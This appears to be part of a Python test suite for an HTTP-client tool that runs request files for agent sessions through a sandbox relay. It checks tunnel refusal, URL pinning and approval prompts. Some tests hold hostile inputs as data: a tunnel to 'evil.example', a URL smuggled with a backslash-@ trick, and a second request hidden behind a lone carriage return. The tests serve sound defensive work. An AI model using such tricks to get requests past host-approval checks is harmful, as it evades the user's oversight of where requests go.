        s.excludes = ["tun/http-client/http-client.env.json"]
        with self.assertRaisesRegex(hc.HttpError, "sessions can see or write"):
            self.m.tool(s, "http_run", {"file": "tun/http-client/t.http", "env": "test app", "index": 0})
        self.assertEqual(opened, [])

    def test_a_tunnel_declared_where_a_session_writes_is_refused(self):
        opened = self.tunnel_project(private={"test app": {"piper": {"ssh": "u@evil.example", "forward": "h:1", "port": 18080}}})
        s = self.session()
        with self.assertRaisesRegex(hc.HttpError, "sessions can see or write"):
            self.m.tool(s, "http_run", {"file": "tun/http-client/t.http", "env": "test app", "index": 0})
        self.assertEqual(opened, [])


    # ---------------------------------------------------------------- a service in the session's own sandbox
    def sandbox_session(self, listening=True, env_doc=None, text=None, private=None, handler=None):
        """A session whose "sandbox" is this process: python3 = sys.executable, its localhost = ours.
        listening: a real HTTP server on the port the env file names."""
        import http.server
        import socket
        import sys
        import threading
        if listening:
            srv = http.server.HTTPServer(("127.0.0.1", 0), handler or http.server.BaseHTTPRequestHandler)
            port = srv.server_address[1]
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            self.addCleanup(srv.server_close)
            self.addCleanup(srv.shutdown)
        else:
            with socket.socket() as so:
                so.bind(("127.0.0.1", 0))
                port = so.getsockname()[1]
        self.write("development/local.http", (text or "### Ping\nGET {{host}}/ping\n").replace("PORT", str(port)))
        self.write("development/http-client.env.json", json.dumps(env_doc or {"headless": {"host": "http://localhost:%d" % port}}))
        if private is not None:
            self.write("development/http-client.private.env.json", json.dumps(private))
        for rel in ("development/local.http", "development/http-client.env.json", "development/http-client.private.env.json"):
            self.addCleanup(lambda r=rel: os.path.exists(os.path.join(self.root, r)) and os.unlink(os.path.join(self.root, r)))
        s = self.session()
        s.instance = "hole-sandbox-x"
        execs = []

        def py(sess):
            execs.append(sess.instance)
            return [sys.executable]
        self.m._sandbox_python = py
        self.addCleanup(self.m.__dict__.pop, "_sandbox_python", None)
        return s, port, execs

    def test_sandbox_run_normalizes_cookie_directive_without_breaking_pins_or_source(self):
        text = ('### Cookie\n< {% const note = "synthetic"; %}\n# @no-cookie-jar\n'
                'GET {{host}}/cookie\nCookie: manual=synthetic\n')
        s, port, _ = self.sandbox_session(text=text)
        for index in (None, 0):
            with self.subTest(index=index):
                out = self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless", "index": index})
                self.assertIn("sandbox", out)
                sent = self.runs()[-1]["text"]
                self.assertLess(sent.index("# @no-cookie-jar"), sent.index("< {%"))
                self.assertLess(sent.index("# @no-redirect"), sent.index("< {%"))
                request = hc.parse(sent)["requests"][0]
                self.assertRegex(request["url"], r"^http://localhost:\d+/cookie$")
                self.assertNotEqual(request["url"], "http://localhost:%d/cookie" % port)
                self.assertIn(["Cookie", "manual=synthetic"], request["headers"])
                with open(os.path.join(self.root, "development/local.http")) as f:
                    self.assertEqual(f.read(), text)

    def test_a_run_to_a_service_in_the_sandbox_goes_through_the_relay_without_a_card(self):
        s, port, execs = self.sandbox_session()
        out = self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        self.assertEqual(self.asked, [])                       # "headless" is prod by name and its env file is
        # visible to the session (localhost = an outside host): both cards fall away - the agent's own server
        self.assertEqual((out["class"], out["sandbox"]), ("dev", "into this session's sandbox through Piper's relay"))
        self.assertTrue(execs and set(execs) == {"hole-sandbox-x"})   # the probe ran in the session's container
        run = self.runs()[0]
        env = json.loads(run["envs"]["-v"])["headless"]["host"]
        self.assertRegex(env, r"^http://localhost:\d+$")
        self.assertNotEqual(env, "http://localhost:%d" % port)  # the relay's port, not the sandbox's
        self.assertIn("# @no-redirect\nGET %s/ping\n" % env, run["text"])   # written out, on the relay's port
        rec = self.m.http_run_record(out["run"])
        self.assertEqual(rec["sandbox"], "this session's sandbox (localhost:%d)" % port)

    def test_nothing_listening_in_the_sandbox_keeps_the_host_route(self):
        s, port, _ = self.sandbox_session(listening=False)
        self.answer = True
        out = self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        self.assertEqual(self.asked[0][0], "http_host")       # localhost of a visible env file: an outside host
        self.assertEqual(out["class"], "prod")
        self.assertNotIn("sandbox", out)
        self.assertNotIn("# @no-redirect", self.runs()[0]["text"])
        env = json.loads(self.runs()[0]["envs"]["-v"])["headless"]["host"]
        self.assertEqual(env, "http://localhost:%d" % port)

    def test_a_script_setting_a_url_variable_is_refused_on_the_sandbox_route(self):
        s, _, _ = self.sandbox_session(text="### A\nGET {{host}}/a\n\n> {% client.global.set(\"host\", \"http://intranet\") %}\n")
        with self.assertRaisesRegex(hc.HttpError, "sets \\{\\{host\\}\\}"):
            self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        s, _, _ = self.sandbox_session(text="### A\nGET {{host}}/a\n\n> {% client.global.set(n, 1) %}\n")
        with self.assertRaisesRegex(hc.HttpError, "computed name"):
            self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        self.assertFalse(os.path.exists(self.log))
        # no variable in any host: a computed name cannot move a request (the host is written out)
        s, _, _ = self.sandbox_session(text="### A\nGET http://localhost:PORT/{{id}}\n\n> {% client.global.set(n, 1) %}\n")
        self.assertIn("sandbox", self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"}))

    def test_a_script_setting_a_path_variable_runs_into_the_sandbox(self):
        # a registration flow: request A sets {{emailA}} / {{sessionA}}, B uses them in its path and query
        text = ("### A\nPOST {{host}}/register\n\n> {% client.global.set(\"emailA\", \"a@b.example\");"
                " request.variables.set(\"sessionA\", \"s1\"); %}\n\n"
                "### B\nGET {{host}}/users/{{emailA}}?session={{sessionA}}\n  &x={{host}}\n")
        s, port, _ = self.sandbox_session(text=text)
        out = self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        self.assertIn("sandbox", out)
        self.assertEqual(self.asked, [])
        sent = self.runs()[0]["text"]
        reqs = hc.parse(sent)["requests"]
        relay = int(re.match(r"^http://localhost:(\d+)/register$", reqs[0]["url"]).group(1))
        self.assertNotEqual(relay, port)
        # the host written out, the path and query left to ijhttp's substitution at run time
        self.assertEqual(reqs[1]["url"], "http://localhost:%d/users/{{emailA}}?session={{sessionA}}&x={{host}}" % relay)

    def test_a_stored_global_is_not_written_into_the_path_on_the_sandbox_route(self):
        # request A of THIS run sets emailA again: B's path must take that value, not the stored one
        text = ("### A\nPOST {{host}}/register\n\n> {% client.global.set(\"emailA\", \"new@b.example\"); %}\n\n"
                "### B\nGET {{host}}/users/{{emailA}}\n")
        s, port, _ = self.sandbox_session(text=text)
        os.makedirs(os.path.dirname(hc.GLOBALS_FILE), exist_ok=True)
        hc.write_json(hc.GLOBALS_FILE, {self.m._globals_key(self.key, "development/local.http", "headless"):
                                        {"emailA": "old@b.example"}})
        self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless", "index": 1})
        sent = self.runs()[0]["text"]
        self.assertNotIn("old@b.example", sent)
        self.assertRegex(hc.parse(sent)["requests"][0]["url"], r"^http://localhost:\d+/users/\{\{emailA\}\}$")

    def test_hidden_values_going_into_the_sandbox_ask_first(self):
        s, port, _ = self.sandbox_session()
        s.excludes = ["development/http-client.private.env.json"]
        self.write("development/http-client.private.env.json", json.dumps({"headless": {"pw": "hidden-pw-1"}}))
        self.answer = True
        out = self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        # the environment's own class stays (headless = prod by name): a card every run, never for the session
        self.assertEqual((self.asked[0][0], self.asked[0][2], out["class"]), ("http_prod", "", "prod"))
        self.assertIn("the HIDDEN values of the environment too", self.asked[0][1])
        self.assertEqual(out["sandbox"], "into this session's sandbox through Piper's relay")
        self.always = True
        self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        self.assertEqual(len(self.asked), 3)

    def test_the_sandbox_route_pins_every_request_url_to_the_relay(self):
        # ijhttp on the host must not reach the host's own localhost:<port> (a port the rewrite missed) nor
        # any host a script picks at run time: each request line is written out with the relay's port
        for text in ("### A\nGET http://LOCALHOST:PORT/u\n",               # ijhttp takes the upper case
                     "@p = PORT\n### A\nGET http://localhost:{{p}}/v\n",   # the port alone in a variable
                     "### A\n< {%\n const v = request.variables; v.set('host', 'http://127.0.0.1:1');\n%}\n"
                     "GET {{host}}/w?a=1\n  &b=2\n",                       # an alias the script check misses
                     "### A\nGET http://evil.example\\@localhost:PORT/x HTTP/1.1\n"):
            if os.path.exists(self.log):
                os.unlink(self.log)
            s, port, _ = self.sandbox_session(text=text)
            out = self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
            self.assertIn("sandbox", out, text)
            sent = self.runs()[0]["text"]
            reqs = hc.parse(sent)["requests"]
            self.assertEqual(len(reqs), 1, sent)
            m = re.match(r"^http://localhost:(\d+)/", reqs[0]["url"])
            self.assertTrue(m, sent)
            self.assertNotEqual(int(m.group(1)), port, sent)
            self.assertNotIn("{{", reqs[0]["url"].split("/")[2], sent)
            self.assertNotIn("@", reqs[0]["url"], sent)
            if "&b=2" in text:   # the continuation lines become part of the written-out request line
                self.assertTrue(reqs[0]["url"].endswith("/w?a=1&b=2"), sent)
        self.assertEqual(self.asked, [])

    def test_a_lone_carriage_return_does_not_hide_a_request_from_the_checks(self):
        # ijhttp splits lines on a lone CR (verified, 2026.1): the second request goes to evil.example
        s, port, _ = self.sandbox_session(text="### A\nGET {{host}}/a\r###\rGET http://evil.example/b\n")
        self.answer = False
        with self.assertRaises(hc.HttpError):
            self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        self.assertEqual(self.asked[0][0], "http_host")
        self.assertIn("evil.example", self.asked[0][1])
        self.assertFalse(os.path.exists(self.log))

    def test_a_binary_body_relayed_as_text_is_a_binary_result(self):
        # the relay turned image/png into text/plain (X-Piper-Content-Type): the run finished, the record and the
        # agent see a binary response of its real type and size, not its bytes decoded as text
        s, port, _ = self.sandbox_session(text="### QR\nGET {{host}}/qr\n\n> {% client.test(\"200\", () => {}); %}\n")
        console = ("Request 'QR' GET http://localhost:%d/qr\n<= response =\nHTTP/1.1 200 OK\nContent-Type: text/plain\n"
                   "Content-Length: 1232\n%s: image/png\n\n\ufffdPNG\x1a\ufffd\n\n"
                   "Response code: 200 (OK); Time: 5ms (5 ms); Content length: 1232 bytes (1.23 kB)\n" % (port, "X-Piper-Content-Type"))
        xml = ('<testsuites><testsuite><testcase classname="http.QR" name="Response" time="0.1" />'
               '<testcase classname="http.QR" name="200" time="0.0" /></testsuite></testsuites>')
        with open(self.spec, "w") as f:
            json.dump({"rc": 0, "console": console, "xml": xml}, f)
        out = self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless"})
        q = out["requests"][0]
        self.assertTrue(q["ok"], q)
        self.assertIn("binary image/png, 1232 bytes", q["body"])
        self.assertIn(["Content-Type", "image/png"], q["headers"])
        rec = self.m.http_run_record(out["run"])["requests"][0]
        self.assertEqual((rec["binary"], rec["body"], rec["body_size"]), (True, "", 1232))
        self.assertNotIn("x-piper-content-type", [k.lower() for k, _ in rec["headers"]])

    def test_save_to_a_binary_from_the_sandbox_keeps_no_decoded_body(self):
        # save_to on the sandbox route fetches through the relay too (text/plain): the record and the agent get
        # no body decoded from the binary bytes, the file gets the bytes as sent
        import http.server
        png = b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 4

        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "image/png")
                self.send_header("Content-Length", str(len(png)))
                self.end_headers()
                self.wfile.write(png)

            def log_message(self, *a):
                pass
        s, port, _ = self.sandbox_session(text="### QR\nGET {{host}}/qr\n", handler=H)
        self.addCleanup(lambda: os.path.exists(os.path.join(self.root, "development/qr.png"))
                        and os.unlink(os.path.join(self.root, "development/qr.png")))
        out = self.m.tool(s, "http_run", {"file": "development/local.http", "env": "headless", "index": 0,
                                          "save_to": "qr.png", "include_body": True})
        q = out["requests"][0]
        self.assertTrue(q["ok"], q)
        with open(os.path.join(self.root, "development/qr.png"), "rb") as f:
            self.assertEqual(f.read(), png)
        self.assertIn(["Content-Type", "image/png"], q["headers"])
        self.assertNotIn("PNG", q["body"])
        rec = self.m.http_run_record(out["run"])["requests"][0]
        self.assertEqual((rec["body"], rec["body_size"]), ("", len(png)))

    def test_the_default_exec_targets_only_the_sessions_agent_container(self):
        import sessions
        s = sessions.Session(kind="project", project=self.key, path=self.root, state="ready")
        s.instance = "hole-sandbox-abc"
        argv = self.m._sandbox_python(s)
        self.assertEqual(argv[1:], ["exec", "-i", "hole-sandbox-abc-agent-1", "python3"])


class PiperdHttpRoutesTest(unittest.TestCase):
    def test_routes_and_gui_scope(self):
        import piperd
        import test_piperd as tp

        class M(tp.FakeManager):
            def http_gui_envs(self, project, path):
                return {"envs": [], "project": project, "path": path}

            def http_gui_files(self, project):
                return {"files": [{"file": "a.http"}], "project": project}

            def http_runs(self, project, path, limit):
                return [{"id": "r"}]

            def http_status(self):
                return {"ijhttp": None}

            def http_run_record(self, rid):
                raise KeyError("unknown run %r" % rid)

            def http_gui_run(self, project, path, env, index, sha="", save_to=""):
                if save_to:
                    return {"id": "r2", "index": index, "save_to": save_to}
                if env == "bad":
                    raise hc.HttpError("unknown environment 'bad'")
                return {"id": "r1", "index": index}

            def http_share(self, rid, on):
                return {"id": rid, "share": on}

            def http_install_start(self):
                return {"installing": True}

            def http_gui_envfile(self, project, path):
                return {"text": "{}", "sha": "a" * 64, "exists": True}

            def http_gui_envfile_save(self, project, path, text, sha):
                return {"ok": True}

            def http_gui_envcfg(self, project, path, targets=False):
                return {"envs": [], "path": path, "targets_loaded": targets}

            def http_gui_envcfg_save(self, project, path, env, cfg):
                return {"ok": True, "cfg": cfg}

            def http_gui_tunnel(self, project, path, env, op):
                return {"state": "open" if op != "close" else "closed"}
        old = piperd.MANAGER
        piperd.MANAGER = M()
        self.addCleanup(setattr, piperd, "MANAGER", old)
        tok, tty = common.mint_token("gui"), common.mint_token("tty")
        code, _, body = tp.get("/api/http/envs?project=p&path=a.http", token=tok)
        self.assertEqual((code, json.loads(body)["path"]), (200, "a.http"))
        self.assertEqual(json.loads(tp.get("/api/http/runs?project=p", token=tok)[2])["runs"], [{"id": "r"}])
        self.assertEqual(json.loads(tp.get("/api/http/files?project=p", token=tok)[2])["files"], [{"file": "a.http"}])
        self.assertEqual(tp.get("/api/http/run?id=x", token=tok)[0], 404)
        code, _, body = tp.post("/api/http/run", {"project": "p", "path": "a.http", "env": "dev", "index": 2}, token=tok)
        self.assertEqual((code, json.loads(body)["index"]), (200, 2))
        self.assertEqual(tp.post("/api/http/run", {"env": "bad"}, token=tok)[0], 409)
        self.assertEqual(tp.post("/api/http/run", {"env": "dev", "index": "1"}, token=tok)[0], 409)
        self.assertEqual(tp.post("/api/http/run", {"env": "dev"}, token=tty)[0], 403)
        self.assertEqual(json.loads(tp.post("/api/http/share", {"id": "r", "on": True}, token=tok)[2])["share"], True)
        self.assertEqual(tp.post("/api/http/install", {}, token=tok)[0], 202)
        self.assertEqual(tp.post("/api/http/run", {"env": "dev"})[0], 401)
        body = json.loads(tp.post("/api/http/run", {"env": "dev", "index": 0, "save_to": "a.pdf"}, token=tok)[2])
        self.assertEqual(body["save_to"], "a.pdf")
        self.assertEqual(json.loads(tp.get("/api/http/envcfg?project=p&path=a.http", token=tok)[2])["path"], "a.http")
        self.assertEqual(tp.get("/api/http/envcfg?project=p&path=a.http", token=tty)[0], 403)
        for scope in (tty,):
            self.assertEqual(tp.get("/api/http/envfile?project=p&path=http-client.env.json", token=scope)[0], 403)
            self.assertEqual(tp.post("/api/http/envfile", {"project": "p", "path": "http-client.env.json"}, token=scope)[0], 403)
        self.assertEqual(tp.get("/api/http/envfile?project=p&path=http-client.env.json", token=tok)[0], 200)
        self.assertEqual(tp.post("/api/http/envfile", {"project": "p", "path": "http-client.env.json", "text": "{}", "sha": "a" * 64}, token=tok)[0], 200)
        self.assertEqual(json.loads(tp.post("/api/http/envcfg", {"env": "t", "cfg": {"verify_tls": False}}, token=tok)[2])["cfg"],
                         {"verify_tls": False})
        self.assertEqual(json.loads(tp.post("/api/http/tunnel", {"env": "t", "op": "close"}, token=tok)[2])["state"], "closed")
        self.assertEqual(tp.post("/api/http/tunnel", {"env": "t", "op": "open"}, token=tty)[0], 403)


if __name__ == "__main__":
    unittest.main()
